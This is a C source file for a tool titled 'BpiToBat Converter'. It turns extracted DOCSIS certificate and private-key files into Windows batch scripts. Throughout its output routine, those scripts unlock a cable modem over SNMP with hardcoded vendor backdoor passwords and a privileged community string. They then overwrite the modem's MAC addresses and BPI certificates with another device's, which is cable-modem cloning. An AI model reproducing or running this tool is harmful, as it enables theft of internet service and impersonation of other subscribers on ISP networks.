# bin-to-tab
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

FILE * FI;
FILE *fp;
FILE *fp5;

char hfcmac[20]="";
char cPublic[350]="";
char cPrivat[1500]="";
char cCm[2000]="";
char cCa[3000]="";
int iPublic;
int iPrivat;
int iCm;
int i=0;
char arquivo[20]="";
char Dir[5000]="";
int getCert();
int DirList();
void salvar();
void TratCert();
void clear();

int main(){
	system("title BpiToBat Converter    by Clow ");
	system("@echo off");
	system("color b1");
	while(DirList()==0){
		getCert();
    	TratCert();
    	salvar();
    	clear();
		//system("pause");
	}
}

int getCert(){
	FI = fopen (arquivo, "rb");
    if(!FI){
    	printf("erro ao abrir %s",arquivo);
    	system("timeout 3");
    	system("exit");
    	return 1;
	}
	int ia=0, ib=0;
	char string[8] ="";
	//Lendo Cabeçalho
	fread(&string,1,8,FI);
	
	//Lendo indice do Public
	fread(&ia,1,1,FI);
	fread(&ib,1,1,FI);
	if(ia>=256){
		ia-=256;
	}
	if(ib>=256){
		ib-=256;
	}
	sprintf(string,"%x%x",ia,ib);
	int indice = (int)strtol(string, NULL, 16);
	iPublic = indice;
	//printf("indice: %x\tia: %d\tib: %d\n",indice,ia,ib);
	//Lendo Certificado Public
	ia=0;
	for(ia;ia<indice;ia++){
		fread(&ib,1,1,FI);
		sprintf(cPublic,"%s%2x",cPublic,ib);
	}
	
	//Lendo indice do Privat
	ia=0;
	ib=0;
	fread(&ia,1,1,FI);
	fread(&ib,1,1,FI);
	if(ia>=256){
		ia-=256;
	}
	if(ib>=256){
		ib-=256;
	}
	sprintf(string,"%x%x",ia,ib);
	indice = (int)strtol(string, NULL, 16);
	iPrivat = indice;
	//printf("indice: %x\tia: %x\tib: %x\n",indice,ia,ib);
	
	//Lendo Certificado Privat
	ia=0;
	for(ia;ia<indice;ia++){
		fread(&ib,1,1,FI);
		sprintf(cPrivat,"%s%2x",cPrivat,ib);
	}
	
	//Pulando Root
	ia=0;
	for(ia;ia<272;ia++){
		fread(&ib,1,1,FI);
	}
	
	//Lendo indice do Cm
	ia=0;
	ib=0;
	fread(&ia,1,1,FI);
	fread(&ib,1,1,FI);
	if(ia>=256){
		ia-=256;
	}
	if(ib>=256){
		ib-=256;
	}
	sprintf(string,"%x%x",ia,ib);
	indice = (int)strtol(string, NULL, 16);
	iCm = indice;
	//printf("indice: %x\tia: %x\tib: %x\n",indice,ia,ib);
	//Lendo Certificado Cm
	ia=0;
	for(ia;ia<indice;ia++){
		fread(&ib,1,1,FI);
		sprintf(cCm,"%s%2x",cCm,ib);
	}
	
	//Lendo indice do Ca
	ia=0;
	ib=0;
	fread(&ia,1,1,FI);
	fread(&ib,1,1,FI);
	if(ia>=256){
		ia-=256;
	}
	if(ib>=256){
		ib-=256;
	}
	sprintf(string,"%x%x",ia,ib);
	indice = (int)strtol(string, NULL, 16);
	//printf("indice: %x\tia: %x\tib: %x\n",indice,ia,ib);
	//Lendo Certificado Ca
	ia=0;
	for(ia;ia<indice;ia++){
		fread(&ib,1,1,FI);
		sprintf(cCa,"%s%2x",cCa,ib);
	}
	fclose(FI);
	//sprintf(Dir,"del %s",arquivo);
	//system(Dir);
}

int DirList(){
	FILE *Dr;
	system("dir /B /O:E /O:N Certs >Dir.txt");
	char arquivo2[51];
	Dr = fopen("Dir.txt", "r");
	fgets( arquivo2, 50, Dr );
	arquivo2[strlen(arquivo2)-1]='\0';
	do{
		if(arquivo2[strlen(arquivo2)-1]=='n'){
			sprintf(arquivo,"%s",arquivo2);
			sprintf(hfcmac,"%s",arquivo);
			hfcmac[12]='\0';
			sprintf(arquivo2,"copy Certs\\%s >>NULL ",arquivo);
			system(arquivo2);
			sprintf(arquivo2,"del Certs\\%s",arquivo);
			system(arquivo2);
			return 0;
		}
		fgets(arquivo2, 50, Dr );
	}while(!feof(Dr));
	fclose(Dr);
	printf("Arquivos .bin nao encontrados!\n");
	system("timeout 3 >>NULL");
	system("del NULL");
	system("del Dir.txt");
	
	return 1;
}

void TratCert(){
	for(i=0;i<strlen(cPublic);i++){
		if(cPublic[i]==' '){
			cPublic[i]='0';
		}
	}
	for(i=0;i<strlen(cPrivat);i++){
		if(cPrivat[i]==' '){
			cPrivat[i]='0';
		}
	}
	for(i=0;i<strlen(cCm);i++){
		if(cCm[i]==' '){
			cCm[i]='0';
		}
	}
	for(i=0;i<strlen(cCa);i++){
		if(cCa[i]==' '){
			cCa[i]='0';
		}
	}
}

void salvar(){
		//Criando diretorios
		printf("%s.bin Completo\n",hfcmac);
		sprintf(Dir,"mkdir out\\%s >>NULL",hfcmac);
		system(Dir);
		//Criando arquivos de saida
		sprintf(Dir,"out\\%s\\%s.bat",hfcmac,hfcmac);
		fp = fopen(Dir , "w" );
		sprintf(Dir,"out\\%s\\%s_5100.bat",hfcmac,hfcmac);
		fp5 = fopen(Dir , "w" );
		
		//Cabeçalho xxx
		sprintf(Dir,"echo off\ncolor b1\ncls\nset /a tr =1\n:_fc\ntitle Acessando como Super Usuario... (Try: %%tr%%)\nset /a tr=(tr+1)\nsnmpset -v2c -c public 192.168.100.1 1.3.6.1.4.1.4413.2.99.1.1.1.2.1.2.1 s humax@!0416 > fc.txt\ncls\nset /p fc=<=\"fc.txt\"\ndel fc.txt\nif \"%%fc%%\" == \"SNMPv2-SMI::enterprises.4413.2.99.1.1.1.2.1.2.1 = STRING: \"humax@!0416\"\" goto _ok\ntimeout 1 > NUL\nsnmpset -v2c -c public 192.168.100.1 1.3.6.1.4.1.4413.2.99.1.1.1.2.1.2.1 s password > fc.txt\ncls\nset /p fc=<=\"fc.txt\"\ndel fc.txt\nif \"%%fc%%\" == \"SNMPv2-SMI::enterprises.4413.2.99.1.1.1.2.1.2.1 = STRING: \"password\"\" goto _ok\ntimeout 1 > NUL\ngoto _fc\n:_ok\nsnmpset -v2c -c gesCM1 192.168.100.1 1.3.6.1.4.1.4413.2.99.1.1.1.1.0 i 2\ncls\ntitle Escrevendo novos MACs...\n");
		fwrite(Dir , 1 , strlen(Dir) , fp );
		//Cabeçalho 5100
		sprintf(Dir,"echo off\ncolor b1\ncls\ntitle Escrevendo novos MACs...\n");
		fwrite(Dir , 1 , strlen(Dir) , fp5 );
		
		//HFCMAC xxx
		sprintf(Dir,"snmpset -Ov -Oq -OT -v2c -c public 192.168.100.1 1.3.6.1.4.1.4413.2.99.1.1.2.1.4.1.2.1 x %s\n",hfcmac);
		fwrite(Dir , 1 , strlen(Dir) , fp );
		//HFCMAC 5100
		sprintf(Dir,"snmpset -Ov -Oq -OT -v2c -c public 192.168.100.1 1.3.6.1.4.1.1166.1.19.4.4.0 x %s\n",hfcmac);
		fwrite(Dir , 1 , strlen(Dir) , fp5 );
		
		//MOD do mac
		Dir[0]=hfcmac[11];
		Dir[1]='\0';
		int xx = (int)strtol(Dir, NULL, 16);
		hfcmac[11]='\0';
		
		//incremento e condicional
		xx++;
		if(xx>=16) xx=0;
		
		//ETHMAC XX
		sprintf(Dir,"snmpset -Ov -Oq -OT -v2c -c public 192.168.100.1 1.3.6.1.4.1.4413.2.99.1.1.2.1.4.1.2.2 x %s%x\n",hfcmac,xx);
		fwrite(Dir , 1 , strlen(Dir) , fp );
		//ETHMAC 5100
		sprintf(Dir,"snmpset -Ov -Oq -OT -v2c -c public 192.168.100.1 1.3.6.1.4.1.1166.1.19.4.3.0 x %s%x",hfcmac,xx);
		fwrite(Dir , 1 , strlen(Dir) , fp5 );
		
		
		//incremento e condicional
		xx++;
		if(xx>=16) xx=0;
		
		//WANMAC XX
		sprintf(Dir,"snmpset -Ov -Oq -OT -v2c -c public 192.168.100.1 1.3.6.1.4.1.4413.2.99.1.1.2.1.4.1.2.3 x %s%x\n",hfcmac,xx);
		fwrite(Dir , 1 , strlen(Dir) , fp );
		
		//Public xx
		sprintf(Dir,"\ntimeout 1 > NULL\ncls\ntitle Escrevendo novo certificado Puplic...\nsnmpset -Ov -Oq -OT -v2c -c gesCM1 192.168.100.1 1.3.6.1.4.1.4413.2.99.1.1.2.2.2.1.0 x %s",cPublic);
		fwrite(Dir , 1 , strlen(Dir) , fp );
		//Public 5100
		while(strlen(cPublic)!=320){
			strcat(cPublic,"0");
		}
		sprintf(Dir,"\ntimeout 1 > NULL\ncls\ntitle Escrevendo novo certificado Puplic...\nsnmpset -Ov -Oq -OT -v2c -c public 192.168.100.1 1.3.6.1.4.1.1166.1.19.4.50.0 x 00%x%s",iPublic, cPublic);
		fwrite(Dir , 1 , strlen(Dir) , fp5 );
		
		//Privat xx
		sprintf(Dir,"\ntimeout 1 > NULL\ncls\ntitle Escrevendo novo certificado Privat...\nsnmpset -Ov -Oq -OT -v2c -c gesCM1 192.168.100.1 1.3.6.1.4.1.4413.2.99.1.1.2.2.2.2.0 x %s",cPrivat);
		fwrite(Dir , 1 , strlen(Dir) , fp );
		//Privat 5100
		while(strlen(cPrivat)!=1296){
			strcat(cPrivat,"0");
		}
		sprintf(Dir,"\ntimeout 1 > NULL\ncls\ntitle Escrevendo novo certificado Privat...\nsnmpset -Ov -Oq -OT -v2c -c public 192.168.100.1 1.3.6.1.4.1.1166.1.19.4.51.0 x 0%x%s",iPrivat, cPrivat);
		fwrite(Dir , 1 , strlen(Dir) , fp5 );
		
		//CM XX
		sprintf(Dir,"\ntimeout 1 > NULL\ncls\ntitle Escrevendo novo certificado CM...    \nsnmpset -Ov -Oq -OT -v2c -c gesCM1 192.168.100.1 1.3.6.1.4.1.4413.2.99.1.1.2.2.2.4.0 x %s",cCm);
		fwrite(Dir , 1 , strlen(Dir) , fp );
		//CM 5100
		while(strlen(cCm)!=1828){
			strcat(cCm,"0");
		}
		sprintf(Dir,"\ntimeout 1 > NULL\ncls\ntitle Escrevendo novo certificado CM...    \nsnmpset -Ov -Oq -OT -v2c -c public 192.168.100.1 1.3.6.1.4.1.1166.1.19.4.52.0 x 0%x%s",iCm, cCm);
		fwrite(Dir , 1 , strlen(Dir) , fp5 );
		
		//CA xx
		sprintf(Dir,"\ntimeout 1 > NULL\ncls\ntitle Escrevendo novo certificado Ca...    \nsnmpset -Ov -Oq -OT -v2c -c gesCM1 192.168.100.1 1.3.6.1.4.1.4413.2.99.1.1.2.2.2.5.0 x %s",cCa);
		fwrite(Dir , 1 , strlen(Dir) , fp );
		
		//Fim
		sprintf(Dir,"\ntimeout 1 > NULL\ncls\ntitle Reiniciando...\nsnmpset -Ov -Oq -OT -v2c -c public 192.168.100.1 1.3.6.1.2.1.69.1.1.3.0 i 1\ntimeout 1 > NULL\ncls\necho FIM by Cl0W\ntimeout 3 > NUL\ndel NULL");
		fwrite(Dir , 1 , strlen(Dir) , fp );
		fwrite(Dir , 1 , strlen(Dir) , fp5 );
		fclose(fp);
		fclose(fp5);
		
		
		
		
		
}

void clear(){
	sprintf (hfcmac,"");
	sprintf (cPublic,"");
    sprintf (cPrivat,"");
    sprintf (cCm,"");
	sprintf (cCa,"");
	i=0;
	sprintf (arquivo,"");
	sprintf (Dir,"");
}
